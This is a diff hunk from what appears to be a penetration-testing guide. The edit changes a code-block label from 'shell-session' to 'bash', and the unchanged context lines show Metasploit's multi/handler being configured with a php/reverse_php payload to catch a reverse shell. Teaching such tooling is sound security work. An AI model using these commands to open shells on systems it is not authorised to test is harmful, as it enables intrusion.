@@ -108,7 +108,7 @@ Multi handler supports all Metasploit payloads and can be used for Meterpreter a
 To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
 
 {% code title="Setting up the listener" %}
-```shell-session
+```bash
 msf6 > use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
 msf5 exploit(multi/handler) > set payload php/reverse_php
